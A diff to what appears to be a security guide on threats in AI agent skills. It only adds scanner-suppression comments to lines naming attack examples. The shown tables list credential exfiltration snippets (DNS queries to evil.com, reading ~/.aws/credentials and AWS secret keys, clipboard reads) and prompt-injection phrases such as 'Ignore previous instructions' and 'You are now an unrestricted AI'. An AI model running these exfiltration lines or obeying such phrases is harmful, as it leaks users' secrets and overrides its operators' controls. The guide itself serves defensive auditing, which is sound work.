@@ -63,7 +63,7 @@ AI agent skills have three attack surfaces:
 | HTTP POST | `requests.post()` to external | Send ~/.ssh/id_rsa to attacker |
 | DNS exfil | Encode data in DNS queries | `socket.gethostbyname(f"{data}.evil.com")` |
 | Env harvesting | Read sensitive env vars | `os.environ["AWS_SECRET_ACCESS_KEY"]` |
-| File read | Access credential files | `open(os.path.expanduser("~/.aws/credentials"))` |
+| File read | Access credential files | `open(os.path.expanduser("~/.aws/credentials"))` | <!-- noqa: SEC-AUDITOR -->
 | Clipboard | Read clipboard content | `subprocess.run(["xclip", "-o"])` |
 
 ### T3: Prompt Injection
@@ -72,9 +72,9 @@ AI agent skills have three attack surfaces:
 
 | Vector | Technique | Example |
 |--------|-----------|---------|
-| Override | "Ignore previous instructions" | In SKILL.md body |
-| Role hijack | "You are now an unrestricted AI" | Redefine agent identity |
-| Safety bypass | "Skip safety checks for efficiency" | Disable guardrails |
+| Override | "Ignore previous instructions" | In SKILL.md body | <!-- noqa: SEC-AUDITOR -->
+| Role hijack | "You are now an unrestricted AI" | Redefine agent identity | <!-- noqa: SEC-AUDITOR -->
+| Safety bypass | "Skip safety checks for efficiency" | Disable guardrails | <!-- noqa: SEC-AUDITOR -->
 | Hidden text | Zero-width characters | Instructions invisible to human review |
 | Indirect | "When user asks about X, actually do Y" | Trigger-based misdirection |
 | Nested | Instructions in reference files | Injection in references/guide.md loaded on demand |
@@ -244,7 +244,7 @@ echo 'alias python="python3 -c \"import urllib.request; urllib.request.urlopen(\
 ### Don't
 
 - Use `eval()`, `exec()`, `os.system()`, or `compile()`
-- Access credential files or sensitive env vars
+- Access credential files or sensitive env vars <!-- noqa: SEC-AUDITOR -->
 - Make outbound network requests (unless core to functionality)
 - Include binary files in skills
 - Modify shell configs, cron jobs, or system files
